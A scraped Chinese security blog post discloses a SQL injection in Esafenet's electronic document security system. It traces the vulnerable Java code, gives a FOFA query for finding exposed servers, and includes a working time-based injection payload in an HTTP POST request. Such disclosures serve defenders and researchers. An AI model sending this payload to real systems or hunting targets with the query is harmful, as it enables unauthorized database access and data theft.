---
title: "亿赛通电子文档安全管理系统 notouchapprove.jsp SQL注入漏洞"
source: https://mrxn.net/jswz/esafenet-notouchapprove-sqli.html
asset_dir: assets/亿赛通电子文档安全管理系统-notouchapprove.jsp-sql注入漏洞
---

# 亿赛通电子文档安全管理系统 notouchapprove.jsp SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/8/5 12:18
* 696浏览
* [0评论](#comment)
* 24分钟阅读

深入探索

漏洞预警服务

JSON处理工具

技术文章订阅


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

亿赛通电子文档安全管理系统的notouchapprove.jsp接口存在[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。攻击者可以通过构造特定的POST请求，在多个参数id中注入恶意SQL代码，利用该漏洞对数据库执行任意SQL操作。攻击者可以通过注入WAITFOR DELAY命令，导致数据库响应时间延迟，从而确认[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)的成功。此漏洞可能导致数据库中的敏感信息泄露、篡改或删除，严重威胁系统的安全性和数据完整性。

文件大小转换

# 影响版本

# fofa语法

> app="亿赛通-电子文档安全管理系统" || body="/CDGServer3/index.jsp"

# 漏洞分析

深入探索

软件

安全研究报告

恶意软件分析工具

直接看 `notouchapprove.jsp` 的定义

```
<%
    MailDecryptApplicationModel model = new MailDecryptApplicationModel();
    String id = request.getParameter("id");
    MailDecryptApplicationInfo info = model.findById(id);
```

参数如`id`被带入`findById`方法

```
public MailDecryptApplicationInfo findById(String id) throws Exception {
    return this.dao.findById(id);
}

public MailDecryptApplicationInfo findById(String id) throws Exception {
    if (id == null) {
        return null;
    } else {
        Map table = new Hashtable();
        table.put("MailDecryptApplicationId", id);
        List list = this.findByPrecise(table);
        return (MailDecryptApplicationInfo)(list.size() != 0 ? list.get(0) : null);
    }
}
```

深入探索

Windows安全工具

安全工具开发

漏洞扫描服务

继续跟进 `findByPrecise` 方法

```
public List findByPrecise(Map map) throws Exception {
    StringBuffer sql = new StringBuffer();
    sql.append("select * from " + this.tableName);
    sql.append(CDGUtil.getWhereClauseForString(map));
    HashMap[] maps = this.getCommonResults(sql.toString());
```

再看下`getWhereClauseForString`的逻辑

```
public static String getWhereClauseForString(Map conditions) {
    if (conditions != null && conditions.size() != 0) {
        StringBuilder sBuilder = new StringBuilder();
        Set set = conditions.keySet();
        Iterator iterator = set.iterator();

        while(iterator.hasNext()) {
            String key = (String)iterator.next();
            Object object = conditions.get(key);
            String value = "";
            if (object instanceof String) {
                value = (String)object;
            } else {
                value = object.toString();
            }

            if (iterator.hasNext()) {
                sBuilder.append(" ").append(key).append("='").append(value).append("' and ");
            } else {
                sBuilder.append(" ").append(key).append("='").append(value).append("'  ");
            }
        }
```

其主要目的就是组装sql语句，可见参数`id`全程未经任何过滤和校验就被直接拼接进sql语句中进行执行，从而导致[sql注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。

# 漏洞复现

```
POST /CDGServer3/client/notouchapprove.jsp;Servicelogin HTTP/1.1
Host: esafenet.mrxn.net
Content-Type: application/x-www-form-urlencoded

id=1'WAITFOR+DELAY'0%3a0%3a5'--
```

[![亿赛通电子文档安全管理系统 notouchapprove.jsp SQL注入漏洞](images/img-001-b2ac4793732a.webp)](https://image.mrxn.net/719cb8dea7c74f649ce4e68851bbd51f.webp)

成功延时 5 秒

SQL注入防护

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[亿赛通电子文档安全管理系统 notouchapprove.jsp SQL注入漏洞](https://mrxn.net/jswz/esafenet-notouchapprove-sqli.html)  
文章链接：<https://mrxn.net/jswz/esafenet-notouchapprove-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/esafenet-notouchapprove-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

代码安全审计

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/esafenet-notouchapprove-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
